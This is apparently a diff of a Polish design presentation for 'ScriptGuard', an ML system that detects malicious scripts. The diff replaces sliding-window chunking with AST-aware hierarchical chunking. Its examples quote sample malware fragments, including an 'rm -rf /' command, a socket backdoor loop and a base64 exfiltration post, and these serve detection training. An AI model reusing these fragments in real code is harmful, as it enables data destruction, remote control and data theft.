@@ -9,7 +9,7 @@
 5. Pipeline orkiestracji (ZenML) — przegląd
 6. Flow treningu: Ingestia i Walidacja Danych
 7. **Flow treningu: Augmentacja (Szczegóły Techniczne)** - Obfuscation, Polimorfizm, Qdrant CVE
-8. **Flow treningu: Wektoryzacja i Chunking (Sliding Window, Child-Parent)**
+8. **Flow treningu: Wektoryzacja i Chunking (Hierarchical AST-aware, Child-Parent)**
 9. **Flow treningu: Fine-tuning (QLoRA - Kwantyzacja, LoRA Adapters)**
 10. Flow treningu: Ewaluacja
 11. Flow inferencji: API i Lifecycle
@@ -38,16 +38,40 @@
 - **Model w ScriptGuard:** `microsoft/unixcoder-base` (specjalizowany dla kodu)
 - **L2 Normalization:** `v_norm = v / ||v||` - zapewnia, że wszystkie wektory mają długość 1.0
 
-### Chunking (Sliding Window)
-**Definicja:** Podział długich dokumentów na mniejsze fragmenty (chunks) z overlapem.
-- **Token-based:** Chunking bazuje na tokenach modelu (nie liniach kodu)
-- **Sliding window:** Overlapping chunks - każdy kolejny chunk zaczyna się przed końcem poprzedniego
+### Chunking (Hierarchical + Sliding Window)
+**Definicja:** Podział długich dokumentów na mniejsze fragmenty (chunks).
+
+**Obecnie: Hybrid Strategy (Hierarchical + Sliding Window Fallback)**
+
+**Hierarchical Chunking (AST-aware) - PRIMARY:**
+- **Semantic boundaries:** Chunks po granicach funkcji/klas (nie arbitrary tokens)
+- **AST parsing:** Wykorzystuje Abstract Syntax Tree do wykrycia granic
+- **Complete units:** Każdy chunk = kompletna funkcja lub klasa
+- **Benefits:**
+  - Semantic coherence: Embeddingi reprezentują pełną logikę (nie fragmenty)
+  - Better retrieval: Few-Shot dostaje kompletne funkcje (nie mixed code)
+  - No overlap waste: Każdy token embedded exactly once
+- **Parametry:**
+  - `max_function_tokens`: 1024 tokens (max single function)
+  - `languages`: Python (ast module) - inne języki w przyszłości
+- **Fallback triggers:**
+  - Function >1024 tokens → sliding window for that function
+  - Syntax error (AST parse fails) → sliding window for file
+  - Non-Python → sliding window
+
+**Sliding Window - FALLBACK:**
+- **Token-based:** Overlapping chunks - każdy chunk zaczyna się przed końcem poprzedniego
 - **Parametry:**
   - `chunk_size`: 512 tokens (max model capacity)
   - `overlap`: 64 tokens (context preservation)
   - `stride`: 448 tokens (chunk_size - overlap)
-- **Child-Parent:** Chunks (children) przechowują referencję do parent document ID
-- **Dlaczego overlap?** Funkcje na granicy chunków byłyby "przecięte" - overlap zapewnia completeness
+- **Used for:** Large functions, parse errors, non-Python code
+
+**Child-Parent Architecture (reused by both strategies):**
+- `parent_id`: SHA256 hash pełnego dokumentu
+- `parent_context`: AST-extracted metadata (imports, function signatures)
+- `chunk_index`, `total_chunks`: Child tracking
+- Hierarchical chunking **completes** this architecture by using AST for boundaries
 
 ### QLoRA (Quantized Low-Rank Adaptation)
 **Definicja:** Efektywna metoda fine-tuningu LLM z kwantyzacją i low-rank adapters.
@@ -501,7 +525,7 @@ Funkcja `augment_with_qdrant_patterns` łączy dane z dwóch kolekcji Qdrant i m
 
 ---
 
-## Slajd 8: Flow treningu — Wektoryzacja i Chunking (Szczegóły Techniczne)
+## Slajd 8: Flow treningu — Wektoryzacja i Chunking (Hierarchical + Child-Parent)
 
 ### Pipeline wektoryzacji (`vectorize_samples.py`)
 1. **Sanityzacja kodu** (`CodeSanitizer`):
@@ -516,36 +540,60 @@ Funkcja `augment_with_qdrant_patterns` łączy dane z dwóch kolekcji Qdrant i m
    - Dodawane na początku każdego chunka
    - **Cel:** Embedding zawiera kontekst metadanych
 
-3. **Chunking** (`ChunkingService` - **Sliding Window**):
-   - **Strategia:** Token-based sliding window (nie line-based!)
-   - **Parametry:**
-     - `chunk_size`: 512 tokens (max_length modelu)
-     - `overlap`: 64 tokens (12.5% overlap)
-     - `stride`: 448 tokens (chunk_size - overlap)
-   - **Proces:**
-     ```
-     Tokenizuj kod → [token1, token2, ..., tokenN]
-     Chunk 1: tokens[0:512]
-     Chunk 2: tokens[448:960]  ← 64 tokens overlap z Chunk 1
-     Chunk 3: tokens[896:1408] ← 64 tokens overlap z Chunk 2
-     ...
-     ```
-   - **Child-Parent Architecture:**
+3. **Chunking** (`ChunkingService` - **Hierarchical (AST-aware) + Fallback**):
+   - **Strategia Primarna: Hierarchical Chunking (Python)**
+     - **AST-based boundaries:** Chunks tworzone po granicach funkcji/klas (nie arbitrary tokens!)
+     - **Semantic coherence:** Każdy chunk = kompletna funkcja lub klasa
+     - **Parametry:**
+       - `max_function_tokens`: 1024 tokens (max single function)
+       - `chunking_strategy`: "hierarchical" (config.yaml)
+     - **Proces:**
+       ```python
+       AST.parse(code) → [module_node, func_a, func_b, class_c]
+       Chunk 0: module-level code (imports, globals)
+       Chunk 1: Complete func_a (całe ciało funkcji)
+       Chunk 2: Complete func_b (całe ciało funkcji)
+       Chunk 3: Complete class_c (cała klasa z metodami)
+       # NO OVERLAP - każdy token embedded exactly once
+       ```
+     - **Zalety:**
+       - Better embeddings: Pure logic (nie mixed fragments)
+       - Better retrieval: Few-Shot dostaje kompletne funkcje
+       - No overlap waste: Efficient storage
+       - Completes parent-child vision: AST używany do boundaries (nie tylko metadata)
+
+   - **Strategia Fallback: Sliding Window**
+     - **Triggers:** Function >1024 tokens, AST parse error, non-Python
+     - **Token-based overlapping chunks:**
+       - `chunk_size`: 512 tokens
+       - `overlap`: 64 tokens
+       - `stride`: 448 tokens
+     - **Proces:**
+       ```
+       Tokenizuj → [token1, ..., tokenN]
+       Chunk 1: tokens[0:512]
+       Chunk 2: tokens[448:960]  ← 64 overlap
+       ...
+       ```
+
+   - **Child-Parent Architecture (reused by both strategies):**
      - **Parent ID:** SHA256 hash pełnego dokumentu (`db_id` + content)
      - **Parent Context:** AST-extracted metadata:
        - Module docstring (pierwsze 200 znaków)
        - Top-level imports (`import os, sys, requests`)
        - Function/class signatures (`def main(args)...`, `class Malware`)
-     - **Child chunks:** Przechowują `parent_id` + `parent_context` + `chunk_index`
-     - **Przykład payload w Qdrant:**
+     - **Child chunks:** `parent_id` + `parent_context` + `chunk_index` + `chunk_type`
+     - **Przykład payload (hierarchical):**
        ```json
        {
          "db_id": 42,
-         "chunk_index": 2,
-         "total_chunks": 5,
+         "chunk_index": 1,
+         "total_chunks": 3,
+         "chunk_type": "function",
+         "function_name": "establish_backdoor",
          "parent_id": "a3f8e1b...",
-         "parent_context": "# Module: File operations | Imports: os, shutil | Definitions: def delete_files(...)",
-         "code_preview": "os.system('rm -rf /')..."
+         "parent_context": "# Imports: socket, base64 | Definitions: def establish_backdoor(), def exfiltrate_data()",
+         "code_preview": "def establish_backdoor(host, port):\n    s = socket.socket()..."
        }
        ```
 
@@ -567,29 +615,52 @@ Funkcja `augment_with_qdrant_patterns` łączy dane z dwóch kolekcji Qdrant i m
    - **Payload indexes:** label, source, language (filtrowanie)
    - Czyści kolekcję przed wgraniem (`clear_existing=True`)
 
-### Wizualizacja Sliding Window Chunking
+### Wizualizacja Hierarchical Chunking (AST-aware)
 
 ```
-Original Code (1200 tokens):
-[========================================================================================================]
- 0                       512                      960                     1408
- |                        |                        |                        |
- |<-------- Chunk 1 ----->|                        |                        |
- |         512 tokens     |                        |                        |
- |                                                  |                        |
- |                  |<--------- Chunk 2 -------->| |                        |
- |                  |           512 tokens        | |                        |
- |                  |      Overlap (64 tokens)    | |                        |
- |                  448 stride ------------------>| |                        |
- |                                                  |                        |
- |                                            |<--------- Chunk 3 -------->|
- |                                            |           512 tokens        |
- |                                            | Overlap (64 tokens)         |
- |                                            448 stride ------------------>|
+Original Python Code (1200 tokens):
+┌─────────────────────────────────────────────────────────────────┐
+│ import socket, base64                    ← Module-level (50 tok)│
+│ API_KEY = "secret"                                               │
+├─────────────────────────────────────────────────────────────────┤
+│ def establish_backdoor(host, port):     ← Function 1 (400 tok) │
+│     s = socket.socket()                                          │
+│     s.connect((host, port))                                      │
+│     while True:                                                  │
+│         cmd = s.recv(1024)                                       │
+│         ...                                                      │
+│     return s                                                     │
+├─────────────────────────────────────────────────────────────────┤
+│ def exfiltrate_data(data):              ← Function 2 (350 tok) │
+│     encoded = base64.b64encode(data)                             │
+│     requests.post(API_URL, data=encoded)                         │
+│     ...                                                          │
+│     return True                                                  │
+├─────────────────────────────────────────────────────────────────┤
+│ class DataEncryptor:                     ← Class (400 tok)      │
+│     def __init__(self):                                          │
+│         self.key = generate_key()                                │
+│     def encrypt(self, plaintext):                                │
+│         ...                                                      │
+└─────────────────────────────────────────────────────────────────┘
+
+Hierarchical Chunking Result:
+Chunk 0 [module]:      50 tokens  ← imports + globals
+Chunk 1 [function]:   400 tokens  ← Complete establish_backdoor()
+Chunk 2 [function]:   350 tokens  ← Complete exfiltrate_data()
+Chunk 3 [class]:      400 tokens  ← Complete DataEncryptor class
+
+NO OVERLAP - każdy token embedded dokładnie raz!
+Każdy chunk = semantically complete unit.
+
+Porównanie z Sliding Window (old approach):
+Chunk 1: tokens[0:512]   ← imports + partial establish_backdoor()   ❌ Mixed
+Chunk 2: tokens[448:960] ← end of backdoor + start of exfiltrate()  ❌ Mixed
+... (overlap waste + semantic fragmentation)
 
 Parent Document Metadata (stored in all chunks):
 - parent_id: "a3f8e1b..."  (SHA256 hash of full document)
-- parent_context: "# Module: utils | Imports: os, sys, requests | def main(), class Config"
+- parent_context: "# Imports: socket, base64 | Definitions: def establish_backdoor(), def exfiltrate_data(), class DataEncryptor"
 ```
 
 ### Child-Parent Retrieval Flow
@@ -614,10 +685,23 @@ flowchart LR
 ```
 
 ### Notatki prelegenta
-- **Dlaczego token-based chunking?** Minifikowany kod (1 linia = 10000 znaków) byłby niepodzielony w line-based chunking.
-- **Dlaczego sliding window z overlapem?** Funkcje na granicy chunków byłyby "przecięte" - overlap zapewnia, że każda funkcja jest kompletna w co najmniej jednym chunku.
-- **Child-Parent:** Podczas wyszukiwania w Qdrant zwracamy chunki (children), ale agregujemy je do poziomu dokumentu (parent) i pobieramy pełny kod z PostgreSQL. To eliminuje truncation w Few-Shot prompt.
-- **Przykład:** Malware o długości 1200 tokenów → 3 chunki. Jeden chunk zawiera main exploit function → high score. Aggregator łączy wszystkie chunki do document ID=42, fetch z SQL zwraca wszystkie 1200 tokenów (nie tylko 512 z najlepszego chunka).
+- **Dlaczego hierarchical chunking (AST-aware)?**
+  - **Semantic coherence:** Embedding reprezentuje kompletną funkcję (pure logic), nie mixed fragments
+  - **Better retrieval:** Few-Shot dostaje complete `establish_backdoor()` function - LLM widzi full malicious intent
+  - **No overlap waste:** Sliding window duplikuje 12.5% tokenów - hierarchical nie marnuje storage
+  - **Completes parent-child vision:** Infrastructure była zaprojektowana od początku dla hierarchical chunking
+- **Fallback strategy:** Large functions (>1024 tokens) lub syntax errors → automatic sliding window
+  - Przykład: 5000-token monolithic script → sliding window chunks
+  - Non-Python (JavaScript, PowerShell) → sliding window (AST parsing Python-only obecnie)
+- **Child-Parent flow (unchanged):**
+  - Qdrant zwraca chunk (e.g., `establish_backdoor()` function)
+  - Aggregate by `parent_id` → deduplicate to document level
+  - Fetch full 1200-token document from PostgreSQL
+  - Few-Shot prompt gets complete context (not just 400-token function)
+- **Real-world impact:**
+  - Query: "backdoor with socket connection"
+  - OLD (sliding window): Returns mixed chunk (50% backdoor + 50% encryption) → ambiguous
+  - NEW (hierarchical): Returns complete `establish_backdoor()` function → CLEAR malicious intent
 
 ---
 
@@ -1369,6 +1453,7 @@ System jest silnie zintegrowany z zewnętrznymi API podczas fazy ingestii, ale p
 ### Najważniejsze osiągnięcia
 ✅ **Hybrid ML System:** LLM (parametric) + RAG (non-parametric) = best of both worlds
 ✅ **Production-Ready RAG:** Fetch-from-Source + reranking + multi-level fallback
+✅ **Hierarchical Chunking (AST-aware):** Function-level chunks for semantic coherence (Python)
 ✅ **Consumer GPU Training:** QLoRA stack → RTX 3090/4090 capable (24GB)
 ✅ **High Quality Data:** Sanitization + augmentation + data leakage prevention
 ✅ **Robust Inference:** Constrained decoding + calibrated confidence + guardrails
@@ -1402,10 +1487,12 @@ Training Pipeline:
    - Production: Vector DB = index, SQL = storage (Fetch-from-Source)
    - **Why:** Payload limits, truncation, data consistency
 
-2. **Token-based chunking > Line-based chunking**
-   - Minified code: 1 line = 10k chars
-   - Token-based: deterministic chunk sizes
-   - Overlap: context preservation na granicach
+2. **Hierarchical chunking (AST-aware) > Token-based sliding window**
+   - Semantic boundaries: Complete functions/classes vs arbitrary token cuts
+   - Better embeddings: Pure logic vs mixed fragments
+   - Improved retrieval: Few-Shot gets complete functions (clearer context)
+   - Parent-child architecture: Infrastructure designed for hierarchical chunking
+   - Fallback strategy: Automatic sliding window for edge cases (large functions, parse errors)
 
 3. **Reranking is critical dla code**
    - Bi-encoder: Fast but semantic similarity ≠ semantic relevance
@@ -1441,7 +1528,12 @@ Training Pipeline:
 #### Quality Improvements
 - [x] **Multi-language Support:** ✓ Partial (.py, .ps1, .js, .vbs, .sh, .bat, .cmd ingestion)
   - [ ] TODO: Multi-language embedding models + per-language parsers
-- [ ] **Hierarchical Chunking:** Function-level chunking (AST-aware) zamiast sliding window
+- [x] **Hierarchical Chunking (AST-aware):** ✓ IMPLEMENTED (Python only, hybrid approach)
+  - Chunks by function/class boundaries instead of arbitrary tokens
+  - Automatic fallback to sliding window for large functions/parse errors
+  - Completes parent-child architecture vision (uses AST for boundaries)
+  - Configuration: `code_embedding.chunking_strategy: "hierarchical"`
+  - [ ] TODO: Extend to JavaScript, PowerShell (requires separate parsers)
 - [ ] **Active Learning:** User feedback loop (false positives → retrain)
 - [ ] **Explainability:** Highlight malicious lines (attribution)
 
